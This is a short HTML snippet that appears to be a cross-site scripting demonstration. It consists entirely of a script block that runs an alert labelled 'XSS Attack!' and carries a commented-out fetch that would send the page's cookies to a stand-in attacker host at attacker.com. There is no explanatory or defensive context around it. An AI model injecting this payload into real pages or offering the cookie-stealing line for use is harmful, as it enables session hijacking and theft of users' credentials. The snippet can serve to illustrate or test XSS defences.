<script>
  // Malicious payload that executes JavaScript
  alert('XSS Attack!');
  // Alternatively, send the cookies to an attacker's server
  // fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>